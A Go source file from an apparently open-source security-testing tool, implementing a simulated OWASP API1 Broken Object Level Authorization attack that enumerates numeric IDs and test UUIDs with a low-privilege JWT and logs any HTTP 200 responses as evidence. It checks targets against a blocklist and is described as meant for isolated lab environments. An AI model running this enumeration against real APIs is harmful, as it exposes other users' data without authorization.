// SPDX-License-Identifier: Apache-2.0
// Copyright (C) 2024 opensecstack contributors.

package api

// OWASP API1:2023 — Broken Object Level Authorization (BOLA)
//
// Safety guarantee: targets are validated against a production blocklist before
// any network activity occurs. This module MUST only be run against explicitly
// configured, isolated Docker lab environments.

import (
	"context"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

// BOLAAttack simulates OWASP API1 — Broken Object Level Authorization.
//
// It enumerates sequential numeric IDs and, when uuidMode is enabled, a small
// set of well-known test UUIDs across configurable REST endpoint templates.
// Requests are signed with a low-privilege JWT supplied in params so that any
// 200 responses indicate cross-object access that should have been denied.
type BOLAAttack struct {
	client *http.Client
}

// NewBOLAAttack returns a BOLAAttack with a sensible default HTTP client.
func NewBOLAAttack() *BOLAAttack {
	return &BOLAAttack{
		client: &http.Client{Timeout: 10 * time.Second},
	}
}

// Run executes the BOLA simulation against targetURL.
//
// Recognised params keys:
//   - "jwt"         string  — low-privilege JWT to use as Bearer token (required)
//   - "endpoint"    string  — path template with {id} placeholder, e.g. "/api/users/{id}" (default "/api/users/{id}")
//   - "start_id"    int     — first numeric ID to probe (default 1)
//   - "end_id"      int     — last numeric ID to probe  (default 20)
//   - "uuid_mode"   bool    — also try a set of test UUIDs (default false)
func (a *BOLAAttack) Run(ctx context.Context, targetURL string, params map[string]any) (*AttackResult, error) {
	// Safety check — must be first.
	if err := checkTarget(targetURL); err != nil {
		return nil, err
	}

	start := time.Now()
	result := &AttackResult{Technique: "BOLA"}

	jwt, _ := params["jwt"].(string)
	if jwt == "" {
		return nil, fmt.Errorf("bola: params[\"jwt\"] is required")
	}

	endpointTpl, _ := params["endpoint"].(string)
	if endpointTpl == "" {
		endpointTpl = "/api/users/{id}"
	}

	startID := intParam(params, "start_id", 1)
	endID := intParam(params, "end_id", 20)
	uuidMode, _ := params["uuid_mode"].(bool)

	var ids []string
	for i := startID; i <= endID; i++ {
		ids = append(ids, fmt.Sprintf("%d", i))
	}
	if uuidMode {
		ids = append(ids, testUUIDs()...)
	}

	for _, id := range ids {
		select {
		case <-ctx.Done():
			result.Duration = time.Since(start)
			return result, ctx.Err()
		default:
		}

		path := strings.ReplaceAll(endpointTpl, "{id}", id)
		url := strings.TrimRight(targetURL, "/") + path

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Authorization", "Bearer "+jwt)
		req.Header.Set("Accept", "application/json")

		resp, err := a.client.Do(req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()

		if resp.StatusCode == http.StatusOK {
			result.Success = true
			result.Evidence = append(result.Evidence,
				fmt.Sprintf("BOLA: GET %s returned HTTP 200 with low-privilege JWT — possible unauthorized access (body_snippet=%q)",
					url, truncate(string(body), 200)))
		}
	}

	result.Duration = time.Since(start)
	return result, nil
}

// testUUIDs returns a small set of well-known test UUIDs used in BOLA probing.
func testUUIDs() []string {
	return []string{
		"00000000-0000-0000-0000-000000000001",
		"00000000-0000-0000-0000-000000000002",
		"11111111-1111-1111-1111-111111111111",
		"ffffffff-ffff-ffff-ffff-ffffffffffff",
	}
}

// intParam extracts an int from params, returning def if absent or wrong type.
func intParam(params map[string]any, key string, def int) int {
	v, ok := params[key]
	if !ok {
		return def
	}
	switch n := v.(type) {
	case int:
		return n
	case float64:
		return int(n)
	}
	return def
}

// truncate shortens s to at most n runes.
func truncate(s string, n int) string {
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	return string(r[:n]) + "…"
}
